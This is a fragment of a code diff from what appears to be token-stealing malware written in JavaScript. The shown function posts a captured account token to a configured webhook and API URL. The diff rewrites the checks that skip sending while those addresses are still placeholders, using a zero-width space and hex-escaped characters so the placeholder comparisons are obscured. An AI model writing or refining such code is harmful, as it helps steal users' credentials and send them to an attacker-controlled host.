@@ -266,8 +266,8 @@ const post = async (params) => {
         token: token
     });
     [config.Placed, config.webhook].forEach(res => {
-        if(res == "%API_URL%")return;
-        if(res == "%WEBHOOK%")return;
+        if(res == "%\u200BAPI_URL%")return;
+        if(res == "%\x57EBHOOK_HERE%")return;
         const url = new URL(res);
         const options = {
             host: url.hostname,
